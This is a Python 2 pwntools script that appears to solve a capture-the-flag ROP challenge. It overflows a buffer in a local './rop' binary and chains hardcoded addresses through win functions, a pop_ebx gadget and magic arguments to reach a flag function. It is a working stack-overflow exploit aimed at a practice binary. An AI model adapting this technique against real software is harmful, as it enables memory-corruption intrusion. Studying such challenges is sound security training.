from pwn import *
def main():
    offset = 28
    elf = ELF("./rop")
    r = elf.process()
    #win_function1 = hex(elf.symbols['win_function1'])
    #win_function2 = hex(elf.symbols['win_function2'])
    win_function1 = 0x80485cb
    win_function2 = 0x80485d8
    flag_function = 0x804862b
    pop_ebx = 0x0804840d
    main = 0x0804873b
    print 'win_function1 : ', win_function1
    print 'win_function2 : ', win_function2
    p = ''
    p += 'a'*offset
    p += p32(win_function1)
    p += p32(main)
    #p += p32(ma)
    r.sendline(p)
    #r.recvline()
    p2 = ""
    p2 += 'A'*offset
    p2 += p32(win_function2)
    p2 += p32(pop_ebx)
    p2 += p32(0xBAAAAAAD)
    p2 += p32(main)
    r.sendline(p2)
    #r.recvline()
    p3 = ""
    p3 += "a"*offset
    p3 += p32(flag_function)
    p3 += "AAAA"
    p3 += p32(0xDEADBAAD)
    r.sendline(p3)
    #r.recvline()
    r.interactive()
if __name__ == '__main__':
    main()
